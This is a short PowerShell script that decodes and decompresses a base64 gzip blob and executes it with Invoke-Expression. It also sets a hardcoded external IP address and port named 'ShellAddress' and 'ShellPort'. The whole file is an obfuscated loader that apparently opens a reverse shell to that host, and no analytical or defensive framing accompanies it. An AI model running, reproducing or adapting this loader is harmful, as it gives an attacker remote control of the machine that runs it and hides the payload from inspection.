
function Convert-FromBase64CompressedScriptBlock {

    [CmdletBinding()] param(
        [String]
        $ScriptBlock
    )

    # Base64 to Byte array of compressed data
    $ScriptBlockCompressed = [System.Convert]::FromBase64String($ScriptBlock)

    # Decompress data
    $InputStream = New-Object System.IO.MemoryStream(, $ScriptBlockCompressed)
    $MemoryStream = New-Object System.IO.MemoryStream
    $GzipStream = New-Object System.IO.Compression.GzipStream $InputStream, ([System.IO.Compression.CompressionMode]::Decompress)
    $GzipStream.CopyTo($MemoryStream)
    $GzipStream.Close()
    $MemoryStream.Close()
    $InputStream.Close()
    [Byte[]] $ScriptBlockEncoded = $MemoryStream.ToArray()

    # Byte array to String
    [System.Text.Encoding] $Encoding = [System.Text.Encoding]::UTF8
    $Encoding.GetString($ScriptBlockEncoded) | Out-String
}


$Script:ShellAddress = "64.228.230.38"
$Script:ShellPort = 20001

$ScriptString = "H4sIAAAAAAAACq1UYU+bUBT9TsJ/YLWbEMtbrWYxGpZQfKsklTY8qjNNsyBcLUp57PGqNpv/fY/WthTQT4MvBO4959xz7kOWZHHv7e0pTRKwKOWnZApxbIYhgyxTDKXx7Rh1Oieoc9RGRyeNmtohZVwUdtrt9mH+WRkRrFg0eQLGdY8OGVh0lkYxhKsuBX0NaJJAwFGaiQ5ZGluzMAbejZIwSu5VMk9TgZmRKZ3H4ZDRQEjRJrKU+syfqVre0sSMUWYGPKKJYLgDBkkAQsY+4TTdlyXOFrL0R5YUca3lmq5r3pybninqxmSRcZih7oLDeDI5PbUY+BzsJOO+QFKL3yetw3bnWDtbom2n/y9wW3UO9oaeazjwrA9uH4Q9yluPAxwRGjwCz5BnDa04goSrdXm1KsFobyTPUxHApse1rnLdxi416mFOPBebl6q27ntzcA2ByxAo9LlvPpl2bN72QdEpUwoVDr7u3niYKDr8rtqGLDp3Ngp3yYrGFICMMr0L/rlaQW61W1W2GDs9frGxvUQiBredXl54YKgOXOuD7gMWGeh8McSOOQMlW2QevkQcXjxkZpYdgRPQ0HbuNXSPvbxf7O5HUgpzaK8lGdGdWlVSsKbGnh35+Ce2XExGfY8YaoRf6tA6378c/h2MuE64GyW9shP5VX1j36mf1BoW1Iekx6efqz4Hg3nibRaoqL+W4J0pDoyG+NmUC1/zs/9e98C7wO5yr9XxMiVwLHouUhHH0ReB2XlQvHvDIaubSDsrL9czi7ztodnAFyLdvFvZUdmuorw16o/+nEzVjyq3mRnNZNSPdyuFBzWPqydZeg18HkxXq3LNIg76FbBbmoHSaP4Sji4d/Acw6dYv9gUAAA=="
$Data = Convert-FromBase64CompressedScriptBlock $ScriptString
iex $Data